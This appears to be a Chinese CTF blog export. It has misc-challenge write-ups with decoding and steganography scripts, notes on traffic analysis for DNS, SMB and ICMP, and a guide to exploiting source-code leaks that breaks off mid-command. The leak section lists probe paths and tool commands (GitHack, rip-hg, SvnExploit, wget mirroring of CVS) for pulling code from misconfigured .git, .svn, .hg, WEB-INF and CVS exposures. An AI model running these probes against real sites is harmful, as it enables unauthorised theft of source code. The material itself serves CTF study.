class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">baseDec</span>(<span class="params">text,type</span>):</span></span><br><span class="line">    <span class="keyword">if</span> type == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> base64.b16decode(text)</span><br><span class="line">    <span class="keyword">elif</span> type == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> base64.b32decode(text)</span><br><span class="line">    <span class="keyword">elif</span> type == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> base64.b64decode(text)</span><br><span class="line">    <span class="keyword">elif</span> type == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> base64.b85decode(text)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">detect</span>(<span class="params">text</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">&quot;^[0-9A-F=]+$&quot;</span>,text.decode()) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">&quot;^[A-Z2-7=]+$&quot;</span>,text.decode()) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">&quot;^[A-Za-z0-9+/=]+$&quot;</span>,text.decode()) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">3</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">autoDec</span>(<span class="params">text</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;MRCTF&#123;&quot;</span> <span class="keyword">in</span> text:</span><br><span class="line">            print(<span class="string">&quot;\n&quot;</span>+text.decode())</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        code = detect(text)</span><br><span class="line">        text = baseDec(text,code)</span><br><span class="line">flag=<span class="string">b&quot;G&amp;eOhGcq(ZG(t2*H8M3dG&amp;wXiGcq(ZG&amp;wXyG(j~tG&amp;eOdGcq+aG(t5oG(j~qG&amp;eIeGcq+aG)6Q&lt;G(j~rG&amp;eOdH9&lt;5qG&amp;eLvG(j~sG&amp;nRdH9&lt;8rG%++qG%__eG&amp;eIeGc+|cG(t5oG(j~sG&amp;eOlH9&lt;8rH8C_qH9&lt;8oG&amp;eOhGc+_bG&amp;eLvH9&lt;8sG&amp;eLgGcz?cG&amp;3|sH8M3cG&amp;eOtG%_?aG(t5oG(j~tG&amp;wXxGcq+aH8V6sH9&lt;8rG&amp;eOhH9&lt;5qG(&lt;E-H8M3eG&amp;wXiGcq(ZG)6Q&lt;G(j~tG&amp;eOtG%+&lt;aG&amp;wagG%__cG&amp;eIeGcq+aG&amp;M9uH8V6cG&amp;eOlH9&lt;8rG(&lt;HrG(j~qG&amp;eLcH9&lt;8sG&amp;wUwGek2)&quot;</span></span><br><span class="line">autoDec(flag)</span><br></pre></td></tr></table></figure><h4 id="不眠之夜"><a href="#不眠之夜" class="headerlink" title="不眠之夜"></a>不眠之夜</h4><p>拿到许多图片，每个图片有红色的字体，想到拼接图片。</p><p>使用kali工具。</p><p>随机拼接图片</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@root:~/桌面/不眠夜之WA<span class="comment"># montage *jpg -tile 10x12 -geometry 200x100+0+0 out.jpg</span></span><br><span class="line">montage: Not a JPEG file: starts <span class="keyword">with</span> <span class="number">0x00</span> <span class="number">0x00</span> `<span class="number">06</span>b66ba.jpg<span class="string">&#x27; @ error/jpeg.c/JPEGErrorHandler/342.</span></span><br><span class="line"><span class="string">montage: delegate library support not built-in &#x27;</span>/usr/share/fonts/type1/gsfonts/n019003l.pf<span class="string">b&#x27; (Freetype) @ warning/annotate.c/RenderFreetype/1836.</span></span><br><span class="line"><span class="string">montage: geometry does not contain image `/tmp/magick-JJP2g7mFGSZHQRZrEpMpVSqzm9hZg4A1&#x27;</span> @ warning/attribute.c/GetImageBoundingBox/<span class="number">510.</span></span><br><span class="line">montage: geometry does <span class="keyword">not</span> contain image `/tmp/magick-JJP2g7mFGSZHQRZrEpMpVSqzm9hZg4A1<span class="string">&#x27; @ warning/transform.c/CropImage/645.</span></span><br></pre></td></tr></table></figure><p>整合图片</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@root:~/桌面/不眠夜之WA<span class="comment"># gaps --image=out.jpg --generations=50 --population=120 --size=100</span></span><br><span class="line"></span><br><span class="line">=== Population:  <span class="number">120</span></span><br><span class="line">=== Generations: <span class="number">50</span></span><br><span class="line">=== Piece size:  <span class="number">100</span> px</span><br><span class="line">=== Pieces:      <span class="number">240</span></span><br><span class="line"></span><br><span class="line">=== Analyzing image: ██████████████████████████████████████████████████ <span class="number">100.0</span>% </span><br><span class="line">=== Solving puzzle:  █████████████------------------------------------- <span class="number">26.5</span>% </span><br><span class="line"></span><br><span class="line">=== GA terminated</span><br><span class="line">=== There was no improvement <span class="keyword">for</span> <span class="number">10</span> generations</span><br><span class="line"></span><br><span class="line">=== Done <span class="keyword">in</span> <span class="number">11.960</span> s</span><br><span class="line">=== Close figure to exit</span><br></pre></td></tr></table></figure><h4 id="Hello-Misc"><a href="#Hello-Misc" class="headerlink" title="Hello_Misc"></a>Hello_Misc</h4><p>一张图片、一个压缩包，图片有点像stegsolve处理过的，放入stegsolve查看。一开始想到的是Data Extract数据提取，索性直接使用<code>zsteg</code>，查看到隐藏了一个压缩包。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@root:~/桌面/flag<span class="comment"># zsteg &#x27;/root/桌面/flag/try to restore it.png&#x27; </span></span><br><span class="line">[?] 294 bytes of extra data after image end (IEND), offset = 0x578d</span><br><span class="line">extradata:<span class="number">0</span>         .. file: Zip archive data, at least v2<span class="number">.0</span> to extract</span><br><span class="line">    <span class="number">00000000</span>: <span class="number">50</span> <span class="number">4</span>b <span class="number">03</span> <span class="number">04</span> <span class="number">14</span> <span class="number">00</span> <span class="number">09</span> <span class="number">00</span>  <span class="number">63</span> <span class="number">00</span> <span class="number">7</span>b <span class="number">9</span>e <span class="number">78</span> <span class="number">50</span> <span class="number">3</span>e a0  |PK......c.&#123;.xP&gt;.|</span><br><span class="line">    <span class="number">00000010</span>: <span class="number">43</span> <span class="number">2</span>a <span class="number">6</span>c <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">96</span> <span class="number">01</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">07</span> <span class="number">00</span> <span class="number">0</span>b <span class="number">00</span> <span class="number">6</span>f <span class="number">75</span>  |C*l...........ou|</span><br><span class="line">    <span class="number">00000020</span>: <span class="number">74</span> <span class="number">2</span>e <span class="number">74</span> <span class="number">78</span> <span class="number">74</span> <span class="number">01</span> <span class="number">99</span> <span class="number">07</span>  <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">41</span> <span class="number">45</span> <span class="number">03</span> <span class="number">08</span> <span class="number">00</span>  |t.txt......AE...|</span><br><span class="line">    <span class="number">00000030</span>: <span class="number">81</span> <span class="number">1</span>e <span class="number">0</span>a f2 f2 e6 <span class="number">76</span> <span class="number">47</span>  b3 bb <span class="number">97</span> <span class="number">11</span> <span class="number">74</span> be fe <span class="number">37</span>  |......vG....t.<span class="number">.7</span>|</span><br><span class="line">    <span class="number">00000040</span>: <span class="number">72</span> <span class="number">32</span> b0 <span class="number">0</span>b <span class="number">53</span> <span class="number">66</span> c5 <span class="number">84</span>  dd <span class="number">96</span> <span class="number">83</span> fe <span class="number">64</span> b5 d5 ce  |r2..Sf......d...|</span><br><span class="line">    <span class="number">00000050</span>: <span class="number">93</span> <span class="number">34</span> <span class="number">54</span> <span class="number">63</span> d8 <span class="number">81</span> <span class="number">17</span> <span class="number">8</span>e  <span class="number">0</span>e <span class="number">09</span> fb <span class="number">7</span>f <span class="number">68</span> <span class="number">05</span> a3 <span class="number">30</span>  |<span class="number">.4</span>Tc........h.<span class="number">.0</span>|</span><br><span class="line">    <span class="number">00000060</span>: <span class="number">52</span> <span class="number">06</span> <span class="number">31</span> <span class="number">20</span> <span class="number">7</span>b <span class="number">44</span> <span class="number">74</span> <span class="number">02</span>  <span class="number">1</span>f a9 <span class="number">70</span> e4 <span class="number">00</span> <span class="number">7</span>e <span class="number">63</span> be  |R<span class="number">.1</span> &#123;Dt...p..~c.|</span><br><span class="line">    <span class="number">00000070</span>: <span class="number">60</span> ce ba <span class="number">24</span> bc a5 d6 c4  eb <span class="number">79</span> f8 <span class="number">76</span> e2 fa <span class="number">96</span> c1  |`..$.....y.v....|</span><br><span class="line">    <span class="number">00000080</span>: <span class="number">64</span> ee <span class="number">6</span>f <span class="number">3</span>e <span class="number">0</span>a fd <span class="number">9</span>e <span class="number">4</span>b  dd e1 <span class="number">23</span> bf <span class="number">72</span> c4 a4 bd  |d.o&gt;...K..<span class="comment">#.r...|</span></span><br><span class="line">    <span class="number">00000090</span>: <span class="number">9</span>e <span class="number">3</span>d <span class="number">4</span>b b1 <span class="number">60</span> <span class="number">0</span>c <span class="number">7</span>e d4  b3 <span class="number">16</span> <span class="number">62</span> c4 <span class="number">50</span> <span class="number">4</span>b <span class="number">07</span> <span class="number">08</span>  |.=K.`.~...b.PK..|</span><br><span class="line">    <span class="number">000000</span>a0: <span class="number">3</span>e a0 <span class="number">43</span> <span class="number">2</span>a <span class="number">6</span>c <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">96</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">50</span> <span class="number">4</span>b <span class="number">01</span> <span class="number">02</span>  |&gt;.C*l.......PK..|</span><br><span class="line">    <span class="number">000000</span>b0: <span class="number">1</span>f <span class="number">00</span> <span class="number">14</span> <span class="number">00</span> <span class="number">09</span> <span class="number">00</span> <span class="number">63</span> <span class="number">00</span>  <span class="number">7</span>b <span class="number">9</span>e <span class="number">78</span> <span class="number">50</span> <span class="number">3</span>e a0 <span class="number">43</span> <span class="number">2</span>a  |......c.&#123;.xP&gt;.C*|</span><br><span class="line">    <span class="number">000000</span>c0: <span class="number">6</span>c <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">96</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">07</span> <span class="number">00</span> <span class="number">2</span>f <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  |l........./.....|</span><br><span class="line">    <span class="number">000000</span>d0: <span class="number">00</span> <span class="number">00</span> <span class="number">20</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">6</span>f <span class="number">75</span> <span class="number">74</span> <span class="number">2</span>e <span class="number">74</span> <span class="number">78</span>  |.. .......out.tx|</span><br><span class="line">    <span class="number">000000e0</span>: <span class="number">74</span> <span class="number">0</span>a <span class="number">00</span> <span class="number">20</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">18</span> <span class="number">00</span> fb b2 <span class="number">95</span>  |t.. ............|</span><br><span class="line">    <span class="number">000000</span>f0: <span class="number">9</span>d d2 <span class="number">01</span> d6 <span class="number">01</span> fd <span class="number">99</span> a2  <span class="number">9</span>f d2 <span class="number">01</span> d6 <span class="number">01</span> fb b2 <span class="number">95</span>  |................|</span><br><span class="line">b1,r,lsb,xy         .. file: PNG image data, <span class="number">526</span> x <span class="number">298</span>, <span class="number">8</span>-bit/color RGB, non-interlaced</span><br><span class="line">b1,bgr,msb,xy       .. text: <span class="string">&quot;C2dB2IH&amp;$&quot;</span></span><br></pre></td></tr></table></figure><p>直接binwalk分离出一个压缩包，但是需要密码。接着返回到<code>stegsolve</code>，图片是红色的，直接<code>Data Extract</code>提取<code>red 0</code>通道。</p><p>拿到一张图片，然后得到压缩包密码，解压之后拿到一个txt，里面有许多数据，其中有255、127，联想到二进制。而且只有四个数字。四个数字尝试转化成二进制，最高位分别是<code>01，11，00，10</code>，后面的都一样，尝试提取前两位数，八个一组转化成ascii。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re </span><br><span class="line">fp = open(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">a = fp.readlines()</span><br><span class="line">p = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    p.append(int(i))</span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> p:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">63</span>:</span><br><span class="line">        a = <span class="string">&#x27;00&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">127</span>:</span><br><span class="line">        a = <span class="string">&#x27;01&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">191</span>:</span><br><span class="line">        a = <span class="string">&#x27;10&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">255</span>:</span><br><span class="line">        a = <span class="string">&#x27;11&#x27;</span></span><br><span class="line">    s += a</span><br><span class="line">   </span><br><span class="line">d = re.findall(<span class="string">r&#x27;.&#123;8&#125;&#x27;</span>, s)</span><br><span class="line">o = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> d:</span><br><span class="line">    o += chr(int(i, <span class="number">2</span>))</span><br><span class="line">print(o)</span><br></pre></td></tr></table></figure><p>拿到flag–<code>rar-passwd:0ac1fe6b77be5dbe</code>。</p><p>解压之后拿到一个zip，打开之后发现是一个word文档，修改为doc，空白处有字符串复制放到sublim中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MTEwMTEwMTExMTExMTEwMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTEwMDAwMDAxMTExMTExMTExMDAxMTAx</span><br><span class="line">MTEwMTEwMTEwMDAxMTAxMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTExMTExMTExMTExMTEwMTEwMDEx</span><br><span class="line">MTEwMDAwMTAxMTEwMTExMDExMTEwMTExMTExMTAwMDExMTExMTExMTExMDAxMDAxMTAxMTEwMDAwMDExMTExMDAwMDExMTExMTEx</span><br><span class="line">MTEwMTEwMTAwMDAxMTExMDExMTEwMTExMTExMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTExMTExMTAwMTEwMTExMTExMTExMTEx</span><br><span class="line">MTEwMTEwMTAxMTExMTExMDExMTEwMTExMTAxMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTAxMTExMTAwMTEwMTExMTExMTExMTEx</span><br><span class="line">MTEwMTEwMTAwMDAxMTAwMDAwMTEwMDAwMDAxMTAwMDExMTAwMDAwMTEwMTEwMTEwMTAxMTEwMDAwMDAxMTExMDAwMDExMTExMTEx</span><br></pre></td></tr></table></figure><p>尝试base64解密，拿到一串0或者1。在word中把1替换为空格，一定要替换为空格，不要替换为空。发现出现的图形不是flag。然后尝试把每一个行进行base64解码。先把word中的文字变成比较能看看到的数字。然后每一行base64解码。替换1，得到flag。</p>]]></content>
      
      
      <categories>
          
          <category> CTF-杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-杂项 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>流量分析</title>
      <link href="2019/05/02/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90--%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/"/>
      <url>2019/05/02/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90--%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h1><h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p>DNS即Domain Name System，域名系统，作为Internet的一个重要组成部分，和常用的协议。DNS采用53端口基于UDP协议，当数据量大时，采用TCP协议。DNS协议的作用是把域名解析到IP地址，或者实现不通域名的跳转等等。在网络安全中也常用DNS数据包作为信息的载体，以绕过防火墙等安全设施。</p><p>DNS的作用就是发送请求，收到对应域名的IP地址。但是DNS并不是一次发包，一次收回。而是需要发很多次，每一次发包都有一个十六进制数据，有利于区别是否是同一次发包。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201018151729591.png" alt="image-20201018151729591"></p><h3 id="请求包"><a href="#请求包" class="headerlink" title="请求包"></a>请求包</h3><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201018152630616.png" alt="image-20201018152630616"></p><p>TXT记录，可以用来隐藏一些信息，常用于反垃圾邮件。</p><h3 id="响应包"><a href="#响应包" class="headerlink" title="响应包"></a>响应包</h3><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201018153359145.png" alt="image-20201018153359145"></p><h3 id="CTF与DNS"><a href="#CTF与DNS" class="headerlink" title="CTF与DNS"></a>CTF与DNS</h3><p>flag通常藏在解析的域名中，拼接所有解析域名，然后进行对应的解码。</p><p>也有可能藏在TXT记录中。</p><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>SMB(全称是Server Message Block)是一个协议名，可用于在计算机间共享文件、打印机、串口等，电脑上的网上邻居就是靠它实现的。通过 SMB 协议，客户端应用程序可以在各种网络环境下读、写服务器上的文件，以及对服务器程序提出服务请求。通过 SMB 协议，应用程序可以访问远程服务器端的文件、以及打印机等资源。SMB 使用下列端口：TCP/139、TCP/445。</p><h3 id="Wireshark与SMB"><a href="#Wireshark与SMB" class="headerlink" title="Wireshark与SMB"></a>Wireshark与SMB</h3><p>首先客户端发送一个SMB negotiate protocol request请求数据报，并列出它所支持的所有SMB协议版本。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/CC56FEC4-D77A-4B24-8151-02EC90078831.png" alt="CC56FEC4-D77A-4B24-8151-02EC90078831"></p><p>服务器收到请求信息后响应请求，并列出希望使用的协议版本。如果没有可使用的协议版本则返回0XFFFFH。</p><p>协议确定后，客户端进程向服务器发起一个用户或共享的认证，这个过程是通过发送session setup request请求数据报实现的。客户端发送一对用户名和密码或一个简单密码到服务器。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201019184710866.png" alt="image-20201019184710866"></p><p>当客户端和服务器完成了磋商和认证之后，它会发送一个Tree connect rerquest SMB数据报并列出它想访问网络资源的名称。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/8419145A-E06F-463D-A5F2-D4208A739E51.png" alt="8419145A-E06F-463D-A5F2-D4208A739E51"></p><p>之后服务器会发送一个tree connect response应答数据报以表示此次连接是否被接受或拒绝</p><p>连接到相应资源后，SMB客户端就能够干一些读、写(需要有权限)等操作了。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/4F7FB594-ED85-45BE-9311-0BD88EE3EDC8.png" alt="4F7FB594-ED85-45BE-9311-0BD88EE3EDC8"></p><p>对于传输的文件，可以直接使用wireshark打开。</p><h3 id="CTF与SMB"><a href="#CTF与SMB" class="headerlink" title="CTF与SMB"></a>CTF与SMB</h3><p>flag通常藏在传输的文件中。</p><h2 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h2><p>CTF与ICMP</p><p>ICMP数据包中的data字段可能藏有flag。另外Ping命令的TTL值也需要格外关注一下，frame.len、data.len的长度也要多注意一下，比较快捷的做法就是直接搜索flag这些敏感字段(一个字符一个字符搜索)，根据规律判断某一个数据对应的字符串是否为flag。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201019194830318.png" alt="image-20201019194830318"></p>]]></content>
      
      
      <categories>
          
          <category> CTF-流量分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-流量分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>源码泄漏</title>
      <link href="2019/05/02/%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%80%BB%E7%BB%93/"/>
      <url>2019/05/02/%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h3 id="git源码泄漏"><a href="#git源码泄漏" class="headerlink" title=".git源码泄漏"></a>.git源码泄漏</h3><p>Git是目前世界上最先进的分布式版本控制系统。主要作用就是用来记录我们更改之后的代码，而不必每次都去重写代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。</span><br></pre></td></tr></table></figure><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>探测：<code>URL/.git/</code></strong></p><p><strong>工具：<code>GitHack.py http://www.steady.org/.git/</code></strong></p><h3 id="Mercurial-hg"><a href="#Mercurial-hg" class="headerlink" title="Mercurial/hg"></a>Mercurial/hg</h3><p>Mercurial 是一个小型但强大的分布式 VCS 系统。</p><p>由于 Mercurial 的分布式性质，很容易在本地操作项目、通过本地提交跟踪并管理自己的更改以及在需要时把这些更改推到远程存储库。</p><h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>探测：<code>URL/.hg/</code></strong></p><p><strong>工具：<code>rip-hg.pl -v -u http://www.steady.com/.hg/</code></strong></p><h3 id="WEB-INF-web-xml-泄露"><a href="#WEB-INF-web-xml-泄露" class="headerlink" title="WEB-INF/web.xml 泄露"></a>WEB-INF/web.xml 泄露</h3><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p><p>Tomcat的WEB-INF目录，每个j2ee的web应用部署文件默认包含这个目录。我们在解决web服务器的性能缺陷以及做均衡负载或者完成一些分层结构的安全策略，在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。</p><h4 id="WEB-INF目录"><a href="#WEB-INF目录" class="headerlink" title="WEB-INF目录"></a>WEB-INF目录</h4><ul><li>WEB-INF/web.xml<br>web应用程序配置文件，描述了servlet和其他的应用组件配置及命名规则。</li><li>WEB-INF/classes<br>包含了站点所有用的class文件，包括servlet class和非servlet class</li><li>WEB-INF/lib<br>存放web应用需要的JAR文件</li><li>WEB-INF/src<br>源码目录，按照包名结构放置各个java文件</li><li>WEB-INF/database.properties<br>数据库配置文件</li><li>WEB-INF/tags<br>存放了自定义标签文件</li><li>WEB-INF/jsp<br>jsp 1.2 一下版本的文件存放位置。</li><li>WEB-INF/jsp2<br>存放jsp2.0以下版本的文件。</li><li>META-INF<br>相当于一个信息包。</li></ul><h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，Nginx不会去考虑配置其他类型引擎导致的安全问题而引入到自身的安全规范中来。</p><h4 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><p>修改Nginx配置文件禁止访问WEB-INF目录。</p><h3 id="SVN文件泄露"><a href="#SVN文件泄露" class="headerlink" title="SVN文件泄露"></a>SVN文件泄露</h3><p>Subversion，是一个开放源代码的版本控制系统。Subversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射。</p><p>我们可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。</p><h4 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>svnExploit</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python SvnExploit.py -u http://steady/.svn</span><br></pre></td></tr></table></figure><h3 id="常规源码泄漏"><a href="#常规源码泄漏" class="headerlink" title="常规源码泄漏"></a>常规源码泄漏</h3><p>网站源码放在web目录，直接访问对应路径即可下载源码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.steady.com/www.steady.com.zip</span><br></pre></td></tr></table></figure><h4 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>常见文件后缀</p><ul><li><strong>.rar</strong></li><li><strong>.zip</strong></li><li><strong>.7z</strong></li><li><strong>.tar.gz</strong></li><li><strong>.bak</strong></li><li><strong>.txt</strong></li><li><strong>.old</strong></li><li><strong>.temp</strong></li></ul><h3 id="CVS泄漏"><a href="#CVS泄漏" class="headerlink" title="CVS泄漏"></a>CVS泄漏</h3><p>CVS是一个C/S系统，多个开发人员通过一个中心版本控制系统来记录文件版本，从而达到保证文件同步的目的。主要是针对CVS/Root以及CVS/Entries目录，直接就可以看到泄露的信息。</p><p>CSV项目在初始化(cvs checkout <code>project</code>)的时候, 会在<code>project</code>目录下创建一个名为<code>CVS</code>的目录，其中保存了各个文件的修改和commit记录. 通过此目录可以获取代码的历史版本， 其中两个关键文件为:<code>CVS/Root</code>和<code>CVS/Entries</code>, 分别记录了项目的根信息和所有文件的结构。</p><h4 id="漏洞利用-5"><a href="#漏洞利用-5" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bk clone http:&#x2F;&#x2F;url&#x2F;name dir</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget -r --no-parent --mirror http:&#x2F;&#x2F;www.steady.com&#x2F;CVS</span><br><span class="line">cd www.steady.com &amp;&amp; cvs diff *</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">直接访问url</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dvcs-ripper （支持旧版和新版的svn，使用方法：rip-cvs.pl -v -u 